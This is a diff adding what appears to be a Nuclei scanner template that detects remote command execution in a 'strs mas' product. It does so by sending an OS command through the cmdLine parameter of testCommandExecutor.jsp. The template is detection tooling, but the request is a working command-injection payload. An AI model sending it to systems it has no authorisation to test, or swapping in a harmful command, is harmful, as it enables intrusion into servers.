@@ -1,0 +1,21 @@
+id: poc-yaml-strs-mas-remote-command-exec
+
+info:
+  name: poc-yaml-strs-mas-remote-command-exec
+  author: cysec
+  severity: critical
+  tags: xray-converted,rce,ct-442528
+  reference:
+    - https://mp.weixin.qq.com/s/VECQ2fn7PptQHsVkNo8rQQ
+
+http:
+  - raw:
+      - |
+        GET /mas/sysinfo/testCommandExecutor.jsp?cmdLine=type%20{{rand_int(1000, 9999)}}%20+%20{{rand_int(1000, 9999)}}&workDir=&pathEnv=&libPathEnv= HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
